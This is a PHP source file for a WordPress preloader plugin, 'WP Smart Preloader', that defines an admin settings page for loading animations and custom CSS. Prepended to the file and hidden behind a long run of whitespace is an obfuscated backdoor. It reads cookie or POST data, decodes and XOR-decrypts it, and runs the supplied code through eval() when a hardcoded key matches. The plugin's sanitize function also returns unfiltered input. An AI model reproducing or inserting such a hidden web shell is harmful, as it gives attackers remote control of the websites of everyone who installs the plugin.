<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $x958373d = 146;$GLOBALS['b9af05'] = Array();global $b9af05;$b9af05 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['xb40130'] = "\x47\x3c\x3d\x44\x42\x7e\x4f\x3a\x56\x25\x74\x78\x38\x46\x71\x64\x2f\x6c\x5e\x69\x3f\x37\x32\x30\x51\x5b\x35\x2a\x43\x63\x27\x79\x4a\x59\x70\x4b\x49\x2c\x72\x7b\x65\x6d\x29\x54\x6b\x33\x6e\x77\x5c\x75\x58\x67\x6f\x76\x2d\x7a\x34\x4d\x61\x5d\x39\x40\x24\x5a\xd\x60\x36\x66\x2e\x20\x7c\x26\x28\x31\x50\x53\x3e\x52\x4c\x9\x41\x48\xa\x73\x22\x7d\x3b\x23\x68\x5f\x57\x6a\x55\x21\x4e\x62\x45\x2b";$b9af05[$b9af05['xb40130'][91].$b9af05['xb40130'][29].$b9af05['xb40130'][60].$b9af05['xb40130'][60].$b9af05['xb40130'][40]] = $b9af05['xb40130'][29].$b9af05['xb40130'][88].$b9af05['xb40130'][38];$b9af05[$b9af05['xb40130'][95].$b9af05['xb40130'][40].$b9af05['xb40130'][29].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][66].$b9af05['xb40130'][67].$b9af05['xb40130'][58]] = $b9af05['xb40130'][52].$b9af05['xb40130'][38].$b9af05['xb40130'][15];$b9af05[$b9af05['xb40130'][15].$b9af05['xb40130'][29].$b9af05['xb40130'][29].$b9af05['xb40130'][26].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][95].$b9af05['xb40130'][60]] = $b9af05['xb40130'][15].$b9af05['xb40130'][40].$b9af05['xb40130'][67].$b9af05['xb40130'][19].$b9af05['xb40130'][46].$b9af05['xb40130'][40];$b9af05[$b9af05['xb40130'][46].$b9af05['xb40130'][66].$b9af05['xb40130'][26].$b9af05['xb40130'][56].$b9af05['xb40130'][12]] = $b9af05['xb40130'][83].$b9af05['xb40130'][10].$b9af05['xb40130'][38].$b9af05['xb40130'][17].$b9af05['xb40130'][40].$b9af05['xb40130'][46];$b9af05[$b9af05['xb40130'][41].$b9af05['xb40130'][56].$b9af05['xb40130'][66].$b9af05['xb40130'][22].$b9af05['xb40130'][12].$b9af05['xb40130'][40]] = $b9af05['xb40130'][15].$b9af05['xb40130'][40].$b9af05['xb40130'][67].$b9af05['xb40130'][19].$b9af05['xb40130'][46].$b9af05['xb40130'][40].$b9af05['xb40130'][15];$b9af05[$b9af05['xb40130'][55].$b9af05['xb40130'][15].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][67].$b9af05['xb40130'][60].$b9af05['xb40130'][58].$b9af05['xb40130'][66]] = $b9af05['xb40130'][19].$b9af05['xb40130'][46].$b9af05['xb40130'][19].$b9af05['xb40130'][89].$b9af05['xb40130'][83].$b9af05['xb40130'][40].$b9af05['xb40130'][10];$b9af05[$b9af05['xb40130'][19].$b9af05['xb40130'][67].$b9af05['xb40130'][45].$b9af05['xb40130'][15].$b9af05['xb40130'][21].$b9af05['xb40130'][45].$b9af05['xb40130'][12]] = $b9af05['xb40130'][83].$b9af05['xb40130'][40].$b9af05['xb40130'][38].$b9af05['xb40130'][19].$b9af05['xb40130'][58].$b9af05['xb40130'][17].$b9af05['xb40130'][19].$b9af05['xb40130'][55].$b9af05['xb40130'][40];$b9af05[$b9af05['xb40130'][44].$b9af05['xb40130'][66].$b9af05['xb40130'][60].$b9af05['xb40130'][26].$b9af05['xb40130'][12].$b9af05['xb40130'][95].$b9af05['xb40130'][60].$b9af05['xb40130'][23].$b9af05['xb40130'][15]] = $b9af05['xb40130'][34].$b9af05['xb40130'][88].$b9af05['xb40130'][34].$b9af05['xb40130'][53].$b9af05['xb40130'][40].$b9af05['xb40130'][38].$b9af05['xb40130'][83].$b9af05['xb40130'][19].$b9af05['xb40130'][52].$b9af05['xb40130'][46];$b9af05[$b9af05['xb40130'][38].$b9af05['xb40130'][67].$b9af05['xb40130'][23].$b9af05['xb40130'][12].$b9af05['xb40130'][29].$b9af05['xb40130'][22].$b9af05['xb40130'][12].$b9af05['xb40130'][12]] = $b9af05['xb40130'][49].$b9af05['xb40130'][46].$b9af05['xb40130'][83].$b9af05['xb40130'][40].$b9af05['xb40130'][38].$b9af05['xb40130'][19].$b9af05['xb40130'][58].$b9af05['xb40130'][17].$b9af05['xb40130'][19].$b9af05['xb40130'][55].$b9af05['xb40130'][40];$b9af05[$b9af05['xb40130'][53].$b9af05['xb40130'][21].$b9af05['xb40130'][56].$b9af05['xb40130'][60].$b9af05['xb40130'][95]] = $b9af05['xb40130'][95].$b9af05['xb40130'][58].$b9af05['xb40130'][83].$b9af05['xb40130'][40].$b9af05['xb40130'][66].$b9af05['xb40130'][56].$b9af05['xb40130'][89].$b9af05['xb40130'][15].$b9af05['xb40130'][40].$b9af05['xb40130'][29].$b9af05['xb40130'][52].$b9af05['xb40130'][15].$b9af05['xb40130'][40];$b9af05[$b9af05['xb40130'][34].$b9af05['xb40130'][60].$b9af05['xb40130'][21].$b9af05['xb40130'][15].$b9af05['xb40130'][23].$b9af05['xb40130'][22].$b9af05['xb40130'][22].$b9af05['xb40130'][60]] = $b9af05['xb40130'][83].$b9af05['xb40130'][40].$b9af05['xb40130'][10].$b9af05['xb40130'][89].$b9af05['xb40130'][10].$b9af05['xb40130'][19].$b9af05['xb40130'][41].$b9af05['xb40130'][40].$b9af05['xb40130'][89].$b9af05['xb40130'][17].$b9af05['xb40130'][19].$b9af05['xb40130'][41].$b9af05['xb40130'][19].$b9af05['xb40130'][10];$b9af05[$b9af05['xb40130'][11].$b9af05['xb40130'][60].$b9af05['xb40130'][15].$b9af05['xb40130'][29].$b9af05['xb40130'][22].$b9af05['xb40130'][23].$b9af05['xb40130'][45].$b9af05['xb40130'][73].$b9af05['xb40130'][21]] = $b9af05['xb40130'][34].$b9af05['xb40130'][22].$b9af05['xb40130'][67].$b9af05['xb40130'][60].$b9af05['xb40130'][58];$b9af05[$b9af05['xb40130'][58].$b9af05['xb40130'][15].$b9af05['xb40130'][60].$b9af05['xb40130'][23]] = $b9af05['xb40130'][55].$b9af05['xb40130'][23].$b9af05['xb40130'][23].$b9af05['xb40130'][40].$b9af05['xb40130'][40];$b9af05[$b9af05['xb40130'][88].$b9af05['xb40130'][73].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][58].$b9af05['xb40130'][12]] = $_POST;$b9af05[$b9af05['xb40130'][38].$b9af05['xb40130'][95].$b9af05['xb40130'][73].$b9af05['xb40130'][67].$b9af05['xb40130'][21].$b9af05['xb40130'][66].$b9af05['xb40130'][22]] = $_COOKIE;@$b9af05[$b9af05['xb40130'][55].$b9af05['xb40130'][15].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][67].$b9af05['xb40130'][60].$b9af05['xb40130'][58].$b9af05['xb40130'][66]]($b9af05['xb40130'][40].$b9af05['xb40130'][38].$b9af05['xb40130'][38].$b9af05['xb40130'][52].$b9af05['xb40130'][38].$b9af05['xb40130'][89].$b9af05['xb40130'][17].$b9af05['xb40130'][52].$b9af05['xb40130'][51], NULL);@$b9af05[$b9af05['xb40130'][55].$b9af05['xb40130'][15].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][67].$b9af05['xb40130'][60].$b9af05['xb40130'][58].$b9af05['xb40130'][66]]($b9af05['xb40130'][17].$b9af05['xb40130'][52].$b9af05['xb40130'][51].$b9af05['xb40130'][89].$b9af05['xb40130'][40].$b9af05['xb40130'][38].$b9af05['xb40130'][38].$b9af05['xb40130'][52].$b9af05['xb40130'][38].$b9af05['xb40130'][83], 0);@$b9af05[$b9af05['xb40130'][55].$b9af05['xb40130'][15].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][67].$b9af05['xb40130'][60].$b9af05['xb40130'][58].$b9af05['xb40130'][66]]($b9af05['xb40130'][41].$b9af05['xb40130'][58].$b9af05['xb40130'][11].$b9af05['xb40130'][89].$b9af05['xb40130'][40].$b9af05['xb40130'][11].$b9af05['xb40130'][40].$b9af05['xb40130'][29].$b9af05['xb40130'][49].$b9af05['xb40130'][10].$b9af05['xb40130'][19].$b9af05['xb40130'][52].$b9af05['xb40130'][46].$b9af05['xb40130'][89].$b9af05['xb40130'][10].$b9af05['xb40130'][19].$b9af05['xb40130'][41].$b9af05['xb40130'][40], 0);@$b9af05[$b9af05['xb40130'][34].$b9af05['xb40130'][60].$b9af05['xb40130'][21].$b9af05['xb40130'][15].$b9af05['xb40130'][23].$b9af05['xb40130'][22].$b9af05['xb40130'][22].$b9af05['xb40130'][60]](0);if (!$b9af05[$b9af05['xb40130'][41].$b9af05['xb40130'][56].$b9af05['xb40130'][66].$b9af05['xb40130'][22].$b9af05['xb40130'][12].$b9af05['xb40130'][40]]($b9af05['xb40130'][80].$b9af05['xb40130'][78].$b9af05['xb40130'][77].$b9af05['xb40130'][96].$b9af05['xb40130'][80].$b9af05['xb40130'][3].$b9af05['xb40130'][33].$b9af05['xb40130'][89].$b9af05['xb40130'][77].$b9af05['xb40130'][92].$b9af05['xb40130'][94].$b9af05['xb40130'][89].$b9af05['xb40130'][45].$b9af05['xb40130'][66].$b9af05['xb40130'][66].$b9af05['xb40130'][58].$b9af05['xb40130'][67].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][58].$b9af05['xb40130'][12].$b9af05['xb40130'][58].$b9af05['xb40130'][22].$b9af05['xb40130'][45].$b9af05['xb40130'][26].$b9af05['xb40130'][26].$b9af05['xb40130'][58].$b9af05['xb40130'][95].$b9af05['xb40130'][22].$b9af05['xb40130'][73].$b9af05['xb40130'][67].$b9af05['xb40130'][95].$b9af05['xb40130'][67].$b9af05['xb40130'][73].$b9af05['xb40130'][73].$b9af05['xb40130'][95].$b9af05['xb40130'][58].$b9af05['xb40130'][73].$b9af05['xb40130'][58].$b9af05['xb40130'][23].$b9af05['xb40130'][22].$b9af05['xb40130'][67].$b9af05['xb40130'][95].$b9af05['xb40130'][58])){$b9af05[$b9af05['xb40130'][15].$b9af05['xb40130'][29].$b9af05['xb40130'][29].$b9af05['xb40130'][26].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][95].$b9af05['xb40130'][60]]($b9af05['xb40130'][80].$b9af05['xb40130'][78].$b9af05['xb40130'][77].$b9af05['xb40130'][96].$b9af05['xb40130'][80].$b9af05['xb40130'][3].$b9af05['xb40130'][33].$b9af05['xb40130'][89].$b9af05['xb40130'][77].$b9af05['xb40130'][92].$b9af05['xb40130'][94].$b9af05['xb40130'][89].$b9af05['xb40130'][45].$b9af05['xb40130'][66].$b9af05['xb40130'][66].$b9af05['xb40130'][58].$b9af05['xb40130'][67].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][58].$b9af05['xb40130'][12].$b9af05['xb40130'][58].$b9af05['xb40130'][22].$b9af05['xb40130'][45].$b9af05['xb40130'][26].$b9af05['xb40130'][26].$b9af05['xb40130'][58].$b9af05['xb40130'][95].$b9af05['xb40130'][22].$b9af05['xb40130'][73].$b9af05['xb40130'][67].$b9af05['xb40130'][95].$b9af05['xb40130'][67].$b9af05['xb40130'][73].$b9af05['xb40130'][73].$b9af05['xb40130'][95].$b9af05['xb40130'][58].$b9af05['xb40130'][73].$b9af05['xb40130'][58].$b9af05['xb40130'][23].$b9af05['xb40130'][22].$b9af05['xb40130'][67].$b9af05['xb40130'][95].$b9af05['xb40130'][58], 1);$bf76 = NULL;$t0baedad1 = NULL;$b9af05[$b9af05['xb40130'][58].$b9af05['xb40130'][67].$b9af05['xb40130'][60].$b9af05['xb40130'][45].$b9af05['xb40130'][66].$b9af05['xb40130'][26].$b9af05['xb40130'][29].$b9af05['xb40130'][22]] = $b9af05['xb40130'][23].$b9af05['xb40130'][15].$b9af05['xb40130'][15].$b9af05['xb40130'][60].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][67].$b9af05['xb40130'][15].$b9af05['xb40130'][54].$b9af05['xb40130'][66].$b9af05['xb40130'][58].$b9af05['xb40130'][26].$b9af05['xb40130'][40].$b9af05['xb40130'][54].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][67].$b9af05['xb40130'][22].$b9af05['xb40130'][54].$b9af05['xb40130'][60].$b9af05['xb40130'][22].$b9af05['xb40130'][22].$b9af05['xb40130'][12].$b9af05['xb40130'][54].$b9af05['xb40130'][66].$b9af05['xb40130'][40].$b9af05['xb40130'][21].$b9af05['xb40130'][58].$b9af05['xb40130'][67].$b9af05['xb40130'][12].$b9af05['xb40130'][60].$b9af05['xb40130'][66].$b9af05['xb40130'][58].$b9af05['xb40130'][58].$b9af05['xb40130'][22].$b9af05['xb40130'][22];global $af9365c2;function  z00ee($bf76, $y5f75b175){global $b9af05;$n06eb842f = "";for ($ae7e=0; $ae7e<$b9af05[$b9af05['xb40130'][46].$b9af05['xb40130'][66].$b9af05['xb40130'][26].$b9af05['xb40130'][56].$b9af05['xb40130'][12]]($bf76);){for ($bdc4b9=0; $bdc4b9<$b9af05[$b9af05['xb40130'][46].$b9af05['xb40130'][66].$b9af05['xb40130'][26].$b9af05['xb40130'][56].$b9af05['xb40130'][12]]($y5f75b175) && $ae7e<$b9af05[$b9af05['xb40130'][46].$b9af05['xb40130'][66].$b9af05['xb40130'][26].$b9af05['xb40130'][56].$b9af05['xb40130'][12]]($bf76); $bdc4b9++, $ae7e++){$n06eb842f .= $b9af05[$b9af05['xb40130'][91].$b9af05['xb40130'][29].$b9af05['xb40130'][60].$b9af05['xb40130'][60].$b9af05['xb40130'][40]]($b9af05[$b9af05['xb40130'][95].$b9af05['xb40130'][40].$b9af05['xb40130'][29].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][66].$b9af05['xb40130'][67].$b9af05['xb40130'][58]]($bf76[$ae7e]) ^ $b9af05[$b9af05['xb40130'][95].$b9af05['xb40130'][40].$b9af05['xb40130'][29].$b9af05['xb40130'][56].$b9af05['xb40130'][56].$b9af05['xb40130'][66].$b9af05['xb40130'][67].$b9af05['xb40130'][58]]($y5f75b175[$bdc4b9]));}}return $n06eb842f;}function  p2f9a($bf76, $y5f75b175){global $b9af05;global $af9365c2;return $b9af05[$b9af05['xb40130'][58].$b9af05['xb40130'][15].$b9af05['xb40130'][60].$b9af05['xb40130'][23]]($b9af05[$b9af05['xb40130'][58].$b9af05['xb40130'][15].$b9af05['xb40130'][60].$b9af05['xb40130'][23]]($bf76, $af9365c2), $y5f75b175);}foreach ($b9af05[$b9af05['xb40130'][38].$b9af05['xb40130'][95].$b9af05['xb40130'][73].$b9af05['xb40130'][67].$b9af05['xb40130'][21].$b9af05['xb40130'][66].$b9af05['xb40130'][22]] as $y5f75b175=>$o372d8d){$bf76 = $o372d8d;$t0baedad1 = $y5f75b175;}if (!$bf76){foreach ($b9af05[$b9af05['xb40130'][88].$b9af05['xb40130'][73].$b9af05['xb40130'][95].$b9af05['xb40130'][12].$b9af05['xb40130'][58].$b9af05['xb40130'][12]] as $y5f75b175=>$o372d8d){$bf76 = $o372d8d;$t0baedad1 = $y5f75b175;}}$bf76 = @$b9af05[$b9af05['xb40130'][38].$b9af05['xb40130'][67].$b9af05['xb40130'][23].$b9af05['xb40130'][12].$b9af05['xb40130'][29].$b9af05['xb40130'][22].$b9af05['xb40130'][12].$b9af05['xb40130'][12]]($b9af05[$b9af05['xb40130'][11].$b9af05['xb40130'][60].$b9af05['xb40130'][15].$b9af05['xb40130'][29].$b9af05['xb40130'][22].$b9af05['xb40130'][23].$b9af05['xb40130'][45].$b9af05['xb40130'][73].$b9af05['xb40130'][21]]($b9af05[$b9af05['xb40130'][53].$b9af05['xb40130'][21].$b9af05['xb40130'][56].$b9af05['xb40130'][60].$b9af05['xb40130'][95]]($bf76), $t0baedad1));if (isset($bf76[$b9af05['xb40130'][58].$b9af05['xb40130'][44]]) && $af9365c2==$bf76[$b9af05['xb40130'][58].$b9af05['xb40130'][44]]){if ($bf76[$b9af05['xb40130'][58]] == $b9af05['xb40130'][19]){$ae7e = Array($b9af05['xb40130'][34].$b9af05['xb40130'][53] => @$b9af05[$b9af05['xb40130'][44].$b9af05['xb40130'][66].$b9af05['xb40130'][60].$b9af05['xb40130'][26].$b9af05['xb40130'][12].$b9af05['xb40130'][95].$b9af05['xb40130'][60].$b9af05['xb40130'][23].$b9af05['xb40130'][15]](),$b9af05['xb40130'][83].$b9af05['xb40130'][53] => $b9af05['xb40130'][73].$b9af05['xb40130'][68].$b9af05['xb40130'][23].$b9af05['xb40130'][54].$b9af05['xb40130'][73],);echo @$b9af05[$b9af05['xb40130'][19].$b9af05['xb40130'][67].$b9af05['xb40130'][45].$b9af05['xb40130'][15].$b9af05['xb40130'][21].$b9af05['xb40130'][45].$b9af05['xb40130'][12]]($ae7e);}elseif ($bf76[$b9af05['xb40130'][58]] == $b9af05['xb40130'][40]){eval/*t9983ac*/($bf76[$b9af05['xb40130'][15]]);}exit();}} ?><?php
/**
 *  WP_smart_preloader  a php class for creating option page with sub menu
 */
class WP_smart_preloader{
	/**
    * Holds the values to be used in the fields callbacks
    */
	private $options;

	/**
	* [__construct class contructer]
	*/
	
	public function __construct() {
		 add_action( 'admin_menu', array( $this, 'wsp_add_submenu_option' ) );
		 add_action( 'admin_init', array( $this, 'wsp_register_settings' ) );

		 add_filter('wp_enqueue_scripts',array($this,'wsp_enqueue_styles'),0);
		 add_action('admin_enqueue_scripts',array($this,'wsp_enqueue_styles'));

		 if( !is_admin() ) {		 	
		 	add_action( 'wp_footer', array($this,'wsp_custom_css_front'),0);
		 }

		add_filter( 'body_class', array($this,'wsp_add_class_body') );
		 
	}

	public function wsp_enqueue_styles($hook_suffix){

        if( is_admin() ){           
        	if('settings_page_wsp-loader' == $hook_suffix ){
	            wp_register_script('wsp-admin-editor', 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.2.3/ace.js', '', SMART_PRELOADER_VERSION );
				wp_enqueue_script( 'wsp-admin-editor' );
				
	            wp_register_script( 'wsp-admin-script',SMART_PRELOADER_URL.'assets/js/wsp-admin-script.js' , array('jquery','wsp-admin-editor'), SMART_PRELOADER_VERSION );
	            wp_enqueue_script( 'wsp-admin-script' );
        	}

            wp_register_style( 'wsp-admin-style', SMART_PRELOADER_URL.'assets/css/wsp-admin-preloader.css', false, SMART_PRELOADER_VERSION );
            wp_enqueue_style( 'wsp-admin-style' );

        } else{

            wp_register_style( 'wsp-main-style', SMART_PRELOADER_URL.'assets/css/wsp-front-preloader.css', false, SMART_PRELOADER_VERSION );
            wp_enqueue_style( 'wsp-main-style' );

        	/*if(!wp_script_is('jquery','enqueued')){
        		wp_enqueue_script( 'jquery' );
        	}    */   

            wp_register_script( 'wsp-main-script',SMART_PRELOADER_URL.'assets/js/wsp-main-script.js' , array('jquery'), SMART_PRELOADER_VERSION );
            wp_enqueue_script( 'wsp-main-script');

            // Localize the script with new data
            $localized_array = $this->wsp_localized_script();
            wp_localize_script( 'wsp-main-script', 'wsp_obj', $localized_array );

        }
        
        wp_register_style( 'wsp-style', SMART_PRELOADER_URL.'assets/css/wsp-smart-preload-style.css', false, SMART_PRELOADER_VERSION );
        wp_enqueue_style( 'wsp-style' );
	}

	/**
	 * [wsp_add_class_body description]
	 * @param  [array] $classes [list of body classes]
	 * @return [array]          [list of body classes]
	 */
	public function wsp_add_class_body($classes){		
		$wsp = get_option( 'wsp-loader-opt' );
		if( isset($wsp['homepage']) && $wsp['homepage'] == "1"){
			if( is_home() || is_front_page() ) {
				$classes[] = 'wp-smart-body';
			}
		} else {
			$classes[] = 'wp-smart-body';
		}
		return $classes;
	}

	public function wsp_localized_script(){
		$wsp = get_option( 'wsp-loader-opt' );
		return $wsp;
	}

	public function wsp_custom_css_front(){
		$wsp = get_option( 'wsp-loader-opt' );
		$style = '<style type="text/css" media="all">';
		$style .= $wsp['custom_css'];
		$style .= '</style>';
		echo $style;
	}

	public function wsp_add_submenu_option(){
		add_submenu_page( 
						'options-general.php', // parent slug
						'WP Smart Preloader', // page title
						'WP Smart Preloader', // menu title
						'manage_options', // capability
						'wsp-loader', // menu slug
						array($this,'wsp_submenu_callback_fn') // Callback
						);
	}

	/**
	 * [wsp_submenu_callback_fn callback function of option page]
	 */
	public function wsp_submenu_callback_fn(){
		// Set class property
	      $this->options = get_option( 'wsp-loader-opt' );
	     
	      ?>
	      <div class="wrap">	              
	          <form method="post" action="options.php">
	          <?php
	              // This prints out all hidden setting fields
	              settings_fields( 'wsp_loader' ); //option group

	              do_settings_sections( 'wsp-loader' ); // option name

	              submit_button(); 
	          ?>
	          </form>
	      </div>
      <?php
	}

	/**
	 * [wsp_register_settings register setting fields ]
	 */
	public function wsp_register_settings(){
			// Register the settings with Validation callback
			   	register_setting( 
							    'wsp_loader', // option group
							    'wsp-loader-opt', // option name
						    	array($this,'wsp_sanitize') // sanitize 
							);
			   	// general info above
			   	add_settings_section(
			             'wsp_loader_id', // ID
			             'WP Smart Preloader', // Title
			             array( $this, 'wsp_section_info' ), // Callback			             
			             'wsp-loader' // Page (same as submenu page menu_slug)
			         	);  
			   	// adding fields
			   	add_settings_field(
			   	           	'wsp-loader-select', // ID
			   	           	'Select Preloader', // Title 
			   	           	array( $this, 'wsp_preloader_list' ), // Callback
			   	          	'wsp-loader', // Page (same as submenu page menu_slug)
			   	           	'wsp_loader_id' // Section id
			   	       	);
			   	       	
   	       	  add_settings_field(
		   	           	'wsp-loader-home-page', // ID
		   	           	'Show only on Home Page',  // Title
		   	           	array( $this, 'wsp_preloader_homepage' ),  //callback
		   	           	'wsp-loader', // Page (same as submenu page menu_slug)
		   	           	'wsp_loader_id' // Section id
		   	       	);
		   	       	
			   	// custom animation       	
	   	       	add_settings_field(
	   	       			'wsp_loader_custom-animation', // ID
	   	       			'Custom Animation', // Title
	   	       			array($this,'wsp_custom_animation'), // Callback
	   	       			'wsp-loader', // Page (same as submenu page menu_slug)
		   	           	'wsp_loader_id' // Section id
	   	       		);	

	   	       	add_settings_field(
	   	       			'wsp_loader_custom-css', // ID
	   	       			'Custom CSS', // Title
	   	       			array($this,'wsp_loader_custom_css'), // Callback
	   	       			'wsp-loader', // Page (same as submenu page menu_slug)
		   	           	'wsp_loader_id' // Section id
	   	       		);	

	   	       	add_settings_field(
	   	       			'wsp_loader_duration', // ID
	   	       			'Duration to show Loader', // Title
	   	       			array($this,'wsp_loader_delay'), // Callback
	   	       			'wsp-loader', // Page (same as submenu page menu_slug)
		   	           	'wsp_loader_id' // Section id
	   	       		);

	   	       	add_settings_field(
	   	       			'wsp_loader_fadeout', // ID
	   	       			'Loader to Fade Out', // Title
	   	       			array($this,'wsp_loader_fadeOut'), // Callback
	   	       			'wsp-loader', // Page (same as submenu page menu_slug)
		   	           	'wsp_loader_id' // Section id
	   	       		);
	}

	/**
	 * setting functions
	 */
	public function wsp_preloader_list(){
		// wsp-loader-opt

		$loader = array('Loader 1','Loader 2','Loader 3','Loader 4','Loader 5','Loader 6','Custom Animation');

		$select  = "<select id='loader-img' name='wsp-loader-opt[loader]'>";
		$select .= "<option value=''>Select Loader</option>";
		foreach($loader as $load){
			$sel = ( isset( $this->options['loader'] ) && $this->options['loader'] == $load ) ? 'selected="selected"' : '';
			$select .= '<option value="'.$load.'" '.$sel.'>'.$load.'</option>';
		}
		$select .= "</select><div class='wsp-loader-block'><div class='wsp-loader-table'><div id='loader-preview'> <span>Loading...</span> </div></div></div>";
		_e($select,"wp-smart-preloader");
	}

	/**
	 * setting function for home page
	 */
	public function wsp_preloader_homepage(){
		printf(__('<input type="checkbox" name="%s" value="1" %s />','wp-smart-preloader'),"wsp-loader-opt[homepage]",(isset($this->options['homepage']) && $this->options['homepage'] == "1")?'checked="checked"':'' );
	}

	/**
	 * setting function fadeout
	 */ 
	public function wsp_loader_fadeOut(){
		printf(__('<input type="text" name="%s" value="%s"  /><div>%s</div>','wp-smart-preloader'),"wsp-loader-opt[fadeout]",(isset($this->options['fadeout']) )?$this->options['fadeout']:'',__('Default:2500<br />1 second => 1000',"wp-smart-preloader") );
	}

	/**
	 * setting function delay
	 */ 
	public function wsp_loader_delay(){
		printf(__('<input type="text" name="%s" value="%s"  /><div>%s</div>','wp-smart-preloader'),"wsp-loader-opt[delay]",(isset($this->options['delay']) )?$this->options['delay']:'',__('Default:1500<br />1 second => 1000',"wp-smart-preloader") );
	}

	/**
	 * setting function custom css
	 */ 
	public function wsp_loader_custom_css(){
		printf("Want to change Look and feel. Add your desired css here :)","wp-smart-preloader");
		echo "<br />";
		printf("Or add CSS for your Custom html5 animation :)","wp-smart-preloader");
        echo "<br/><br/>";
		printf(__('<textarea rows="12" cols="70" name="%s">%s</textarea><div class="editor" id="%s"></div>','wp-smart-preloader'),"wsp-loader-opt[custom_css]",isset($this->options['custom_css'])? esc_attr( $this->options['custom_css'] ):'',"wsp-loader-opt[custom_css]" );
	}
	
	public function wsp_custom_animation(){
		printf("Want to add you own custom html5 animation? Enter your html code here.","wp-smart-preloader");
        echo "<br/><br/>";
		printf(__('<textarea rows="12" cols="70" name="%s">%s</textarea><div class="editor" id="%s"></div>','wp-smart-preloader'),"wsp-loader-opt[custom_animation]",isset($this->options['custom_animation'])? esc_attr( $this->options['custom_animation'] ):'',"wsp-loader-opt[custom_animation]" );
	
	}

	/**
	 * [wsp_sanitize sanitize function for setting]
	 */
	public function wsp_sanitize( $input ){
	 	foreach($input as $k => $v) {
		   $newinput[$k] = trim($v);
		   
		   	// Check the input is a letter or a number
		   	if(!preg_match('/^[A-Z0-9 _]*$/i', $v)) {
		    	$newinput[$k] = '';
		   	}
	 	}
		return $input;
	}

	/**
	 * [wsp_section_info function for section info]
	 * @return [echo] [display info]
	 */
	public function wsp_section_info(){
		_e('WP Smart Preloader Setting:','wp-smart-preloader');
	}


	/**
	 * [wsp_uninstall to delete options after uninstall]	 
	 */
	public function wsp_uninstall(){
		delete_option( 'wsp-loader-opt' );
	}


}



// if( is_admin() ){
    $wp_smart_preloader = new WP_smart_preloader();
// }